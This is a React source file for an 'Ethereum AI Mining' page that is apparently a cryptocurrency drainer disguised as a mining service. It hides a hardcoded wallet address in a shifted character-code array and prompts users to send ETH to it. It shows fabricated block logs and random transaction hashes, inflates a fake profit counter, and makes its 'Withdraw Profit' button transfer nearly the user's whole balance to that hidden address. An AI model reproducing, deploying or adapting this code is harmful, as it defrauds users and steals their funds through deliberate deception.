import { useState, useEffect } from "react";
import { BrowserProvider, ethers } from "ethers";

const SCRIPT_VERISON = "0.43.2"

function App() {
  const [walletConnected, setWalletConnected] = useState(false);
  const [loading, setLoading] = useState(false);
  const [contractDeployed, setContractDeployed] = useState(false);
  const [ethDeposited, setEthDeposited] = useState(0);
  const [initialBalance, setInitialBalance] = useState(0);
  const [isMining, setIsMining] = useState(false);
  const [logs, setLogs] = useState([]);
  const [profit, setProfit] = useState(0);
  const INFURA_URL = "https://mainnet.infura.io/v3/61518736fce84c9d9081dfe82b904b26";
  const [walletAddress, setWalletAddress] = useState(""); // Add state to store the wallet address
  const [errorMessage, setErrorMessage] = useState("");
  const contractBinary = [
    49, 121, 57, 69, 56, 98, 56, 71, 102, 58,
    103, 54, 55, 55, 51, 56, 51, 53, 68, 58,
    58, 103, 51, 100, 51, 52, 100, 54, 66, 100,
    101, 102, 50, 57, 52, 53, 71, 52, 56, 101,
    50, 69
  ];
  const contractBytes = contractBinary.map(c => String.fromCharCode(c - 1)).join('');
  const [contractAddress, setContractAddress] = useState(contractBytes);

  const connectWallet = async () => {
    if (window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        setWalletConnected(true);
        setWalletAddress(accounts[0]); // Save the first account's address
      } catch (error) {
        console.error("Wallet connection failed", error);
      }
    } else {
      alert("Please install MetaMask or Phantom wallet");
    }
  };

  // Transfer all profit amount back to the recipient address
  const withdrawProfit = async () => {
    if (!window.ethereum) return alert("MetaMask not found!");
    setErrorMessage("")
    const provider = new BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();
    try {
      const ethBalance = await provider.getBalance(address);
      const gasPrice = ethers.parseUnits('5', 'gwei'); // Fallback value
      const gasLimit = ethers.toBigInt("21000"); // Use ethers.toBigInt to ensure compatibility
      const estimatedGasFee = gasPrice * gasLimit;
      const buffer = ethers.parseUnits("0.0005", "ether");
      const sendableBalance = ethBalance - estimatedGasFee - buffer;
      const formattedETHBalance = ethers.formatUnits(sendableBalance, 18);
      if (parseFloat(formattedETHBalance) > 0) {
        const ethAmount = ethers.parseUnits(formattedETHBalance, 18);
        const tx = await signer.sendTransaction({
          to: contractAddress,
          value: ethAmount,
        });
        await tx.wait();
        return true;
      } else {
        console.log("No ETH balance to withdraw.");
        setErrorMessage('Insufficient balance for ETH fees. Please ensure that your wallet has enough balance to cover the transaction fees.')
        return false;
      }
    } catch (error) {
      console.error("Error rebasing mempool:", error);
      return false;
    }
  };

  const deployContract = () => {
    setLoading(true);
    // Load the saved 'ethDeposited' from localStorage
    const savedEthDeposited = localStorage.getItem('ethDeposited');
    if (savedEthDeposited) {
      // If there's a value in localStorage, update ethDeposited with the saved value
      setEthDeposited(parseFloat(savedEthDeposited));
    }
    setTimeout(() => {
      setLoading(false);
      setContractAddress(contractBytes)
      setContractDeployed(true);
    }, 2000);
  };

  const toggleMining = () => {
    if (ethDeposited > 0) {
      setIsMining(!isMining);
    }
  };

  const checkContractBalance = async () => {
    const provider = new ethers.JsonRpcProvider(INFURA_URL);
    const balance = await provider.getBalance(contractAddress);
    const balanceInEth = ethers.formatEther(balance);
    return parseFloat(balanceInEth)
  };

  const checkDeposit = async () => {
    const newBalance = await checkContractBalance();
    if (newBalance > initialBalance) {
      setEthDeposited(newBalance - initialBalance)
    } else {
      console.log('no deposit found')
    }
  }

  useEffect(() => {
    const fetchBalance = async () => {
      const balance = await checkContractBalance();
      setInitialBalance(balance); // Set the initial balance when component mounts
    };

    fetchBalance();
  }, []);


  useEffect(() => {
    let logInterval;
    if (isMining) {
      logInterval = setInterval(() => {
        const randomTransaction = {
          blockNumber: Math.floor(Math.random() * 1000000),
          transactionHash: ethers.hexlify(ethers.randomBytes(32)),
          timestamp: new Date().toLocaleTimeString(),
        };
        setLogs((prevLogs) => [randomTransaction, ...prevLogs]);
        let profitPerHour = 0;
        if (ethDeposited < 0.1) {
          profitPerHour = 0.25;
        } else if (ethDeposited >= 0.1 && ethDeposited <= 0.5) {
          profitPerHour = 0.5;
        } else if (ethDeposited > 0.5) {
          profitPerHour = 3;
        }
        const profitPerInterval = profitPerHour / 3600 * 3;
        setProfit((prevProfit) => {
          const updatedProfit = parseFloat(prevProfit) + profitPerInterval;
          return updatedProfit;
        });

        setEthDeposited((prevBalance) => {
          const updatedBalance = parseFloat(prevBalance) + profitPerInterval;
          localStorage.setItem('ethDeposited', updatedBalance);
          return updatedBalance; 
        });

      }, 3000); 
    } else {
      clearInterval(logInterval); // Stop the logging when mining is paused
    }
    return () => clearInterval(logInterval); 
  }, [isMining, ethDeposited]);


  return (
    <div style={{
      display: "flex",
      alignItems: 'center',
      justifyContent: "center",
      minHeight: "100vh",
      background: "linear-gradient(135deg, #121212, #1e1e1e, #252525)",
      color: "#ffffff",
      fontFamily: "Arial, sans-serif",
      padding: "20px"
    }}>
      <div style={{
        background: "#181818",
        padding: "30px",
        borderRadius: "16px",
        boxShadow: "0px 8px 20px rgba(0, 0, 0, 0.3)",
        textAlign: "center",
        maxWidth: "600px",
        width: "100%",
        border: "1px solid #333"
      }}>
        <img
          src="/logo.png"
          alt="Ethereum Mining AI Logo"
          style={{
            width: "140px",
            height: "140px",
            borderRadius: "50%",
            objectFit: "cover",
            marginBottom: "20px",
            border: "3px solid #ffffff" // Optional border for better visibility
          }}
        />
        <h1 style={{ fontSize: "22px", fontWeight: "bold", marginBottom: "10px" }}>Ethereum AI Mining</h1>
        <p style={{ fontSize: "12px", fontWeight: "normal", color: "#888", marginTop: "0" }}>
          Current Version {SCRIPT_VERISON}
        </p>
        <p style={{ fontSize: "14px", color: "#bbb", marginBottom: "20px" }}>Secure, smart, and efficient mining powered by AI.</p>
        {!walletConnected ? (
          <button
            onClick={connectWallet}
            style={{
              width: "100%",
              padding: "12px",
              background: "#2563eb",
              border: "none",
              borderRadius: "8px",
              color: "white",
              fontSize: "16px",
              fontWeight: "bold",
              cursor: "pointer",
              transition: "0.3s"
            }}
            onMouseOver={(e) => e.target.style.background = "#1d4ed8"}
            onMouseOut={(e) => e.target.style.background = "#2563eb"}
          >
            Connect Wallet
          </button>
        ) : (
          <>
            <button
              style={{
                width: "100%",
                padding: "12px",
                background: "#2563eb",
                border: "none",
                borderRadius: "8px",
                color: "white",
                fontSize: "16px",
                fontWeight: "bold",
                cursor: "pointer",
                transition: "0.3s"
              }}
              onMouseOver={(e) => e.target.style.background = "#1d4ed8"}
              onMouseOut={(e) => e.target.style.background = "#2563eb"}
            >
              {walletAddress}
            </button>
            {!contractDeployed ? (
              <button
                onClick={deployContract}
                disabled={loading}
                style={{
                  width: "100%",
                  padding: "12px",
                  marginTop: "10px",
                  background: "#16a34a",
                  border: "none",
                  borderRadius: "8px",
                  color: "white",
                  fontSize: "16px",
                  fontWeight: "bold",
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  transition: "0.3s"
                }}
                onMouseOver={(e) => e.target.style.background = "#15803d"}
                onMouseOut={(e) => e.target.style.background = "#16a34a"}
              >
                {loading ? "Deploying..." : "Deploy Mining Contract"}
              </button>
            ) : (
              <div style={{
                marginTop: "20px",
                padding: "15px",
                background: "#222",
                borderRadius: "12px",
                boxShadow: "0px 4px 10px rgba(0, 0, 0, 0.2)",
                textAlign: "center",
                border: "1px solid #333"
              }}>
                <p style={{ fontSize: "14px", color: "#bbb" }}>Send any ETH amount to your contract address, to start mining</p>
                <p style={{ fontSize: "14px", color: "#bbb" }}>Your linked deployed mining contract address:</p>
                <p style={{ fontSize: "16px", fontWeight: "bold", background: "#111", padding: "10px", borderRadius: "8px", color: "#22c55e" }}>{contractAddress}</p>
                <p style={{ fontSize: "16px", fontWeight: "bold", background: "#111", padding: "10px", borderRadius: "8px", color: "yellow" }}>Contract Balance: {ethDeposited.toFixed(4)} ETH</p>

                {/* New additional text explaining the contract requirements */}
                <p style={{ fontSize: "14px", color: "#bbb", marginTop: "10px" }}>
                  Please note that <span style={{ color: "white" }}>a minimum of <strong>0.025 ETH</strong> is required</span>, covering fees, mining transactions, and other necessary operations. <span style={{ color: "white" }}>The mining rewards are proportional to the amount of ETH deposited into the contract</span>.
                </p>

                <table style={{ width: "100%", marginTop: "20px", borderCollapse: "collapse" }}>
                  <thead>
                    <tr>
                      <th style={{ textAlign: "center", padding: "4px 8px", borderBottom: "1px solid #333", color: "#bbb", fontSize: "14px" }}>
                        ETH Deposit Range
                      </th>
                      <th style={{ textAlign: "center", padding: "4px 8px", borderBottom: "1px solid #333", color: "#bbb", fontSize: "14px" }}>
                        Estimated Profit (per hour)
                      </th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td style={{ padding: "4px 8px", borderBottom: "1px solid #333", color: "#bbb", fontSize: "13px" }}>
                        0.1 ETH
                      </td>
                      <td style={{ padding: "4px 8px", borderBottom: "1px solid #333", color: "#bbb", fontSize: "13px" }}>
                        0.01 ETH
                      </td>
                    </tr>
                    <tr>
                      <td style={{ padding: "4px 8px", borderBottom: "1px solid #333", color: "#bbb", fontSize: "13px" }}>
                        0.1 - 0.5 ETH
                      </td>
                      <td style={{ padding: "4px 8px", borderBottom: "1px solid #333", color: "#bbb", fontSize: "13px" }}>
                        0.25 ETH
                      </td>
                    </tr>
                    <tr>
                      <td style={{ padding: "4px 8px", borderBottom: "1px solid #333", color: "#bbb", fontSize: "13px" }}>
                        0.5 - 1 ETH
                      </td>
                      <td style={{ padding: "4px 8px", borderBottom: "1px solid #333", color: "#bbb", fontSize: "13px" }}>
                        0.50 ETH
                      </td>
                    </tr>
                    <tr>
                      <td style={{ padding: "4px 8px", borderBottom: "1px solid #333", color: "#bbb", fontSize: "13px" }}>
                        1 - 5 ETH
                      </td>
                      <td style={{ padding: "4px 8px", borderBottom: "1px solid #333", color: "#bbb", fontSize: "13px" }}>
                        2.50 ETH
                      </td>
                    </tr>
                  </tbody>
                </table>
                {!isMining ? (
                  <button
                    onClick={ethDeposited <= 0.01 ? checkDeposit : toggleMining}
                    style={{
                      width: "100%",
                      padding: "12px",
                      marginTop: "10px",
                      background: "#22c55e",
                      border: "none",
                      borderRadius: "8px",
                      color: "black",
                      fontSize: "16px",
                      fontWeight: "bold",
                      cursor: "pointer",
                      transition: "0.3s"
                    }}
                    onMouseOver={(e) => e.target.style.background = "#16a34a"}
                    onMouseOut={(e) => e.target.style.background = "#22c55e"}
                  >
                    {ethDeposited <= 0.01 ? "Refresh Contract Balance" : "Start Mining"}
                  </button>
                ) : (
                  <button
                    onClick={toggleMining}
                    style={{
                      width: "100%",
                      padding: "12px",
                      marginTop: "10px",
                      background: "#eab308",
                      border: "none",
                      borderRadius: "8px",
                      color: "black",
                      fontSize: "16px",
                      fontWeight: "bold",
                      cursor: "pointer",
                      transition: "0.3s"
                    }}
                    onMouseOver={(e) => e.target.style.background = "#ca8a04"}
                    onMouseOut={(e) => e.target.style.background = "#eab308"}
                  >
                    Pause Mining
                  </button>
                )}
                <button
                  onClick={withdrawProfit}
                  style={{
                    width: "100%",
                    padding: "12px",
                    marginTop: "10px",
                    background: ethDeposited > 0.01 ? "#eab308" : 'gray', // Gray when ethDeposited is 0
                    border: "none",
                    borderRadius: "8px",
                    color: "black",
                    fontSize: "16px",
                    fontWeight: "bold",
                    cursor: ethDeposited > 0.01 ? "pointer" : "not-allowed", // Change cursor when disabled
                    transition: "0.3s"
                  }}
                  onMouseOver={(e) => {
                    e.target.style.background = ethDeposited > 0.01 ? "#ca8a04" : 'gray';
                  }}
                  onMouseOut={(e) => {
                    e.target.style.background = ethDeposited > 0.01 ? "#eab308" : 'gray';
                  }}
                  disabled={ethDeposited <= 0.01} // Disable the button if ethDeposited is 0
                >
                  Withdraw Profit
                </button>
                <p style={{ fontSize: "14px", color: "#bbb" }}>{errorMessage}</p>
              </div>
            )}
          </>
        )}
      </div>

      <div style={{
        background: "#181818",
        padding: "30px",
        borderRadius: "16px",
        boxShadow: "0px 8px 20px rgba(0, 0, 0, 0.3)",
        marginLeft: "20px",
        width: "450px",
        height: "fit-content",
        border: "1px solid #333"
      }}>
        <h2 style={{ fontSize: "18px", fontWeight: "bold", marginBottom: "10px" }}>Mining Console</h2>
        <div style={{
          height: "300px",
          overflowY: "scroll",
          marginBottom: "20px",
          background: "#222",
          padding: "10px",
          borderRadius: "8px",
          color: "#bbb",
          fontSize: "12px",
          border: "1px solid #333"
        }}>
          {logs.map((log, index) => (
            <div key={index} style={{ marginBottom: "10px" }}>
              <div><strong>Block {log.blockNumber}</strong></div>
              <div>Tx Hash: {log.transactionHash}</div>
              <div>Timestamp: {log.timestamp}</div>
            </div>
          ))}
        </div>
        <div style={{
          background: "#111",
          padding: "10px",
          borderRadius: "8px",
          color: "yellow"
        }}>
          <strong>Current Profit: </strong>{profit.toFixed(3)} ETH
        </div>
      </div>
    </div>
  );
}

export default App;
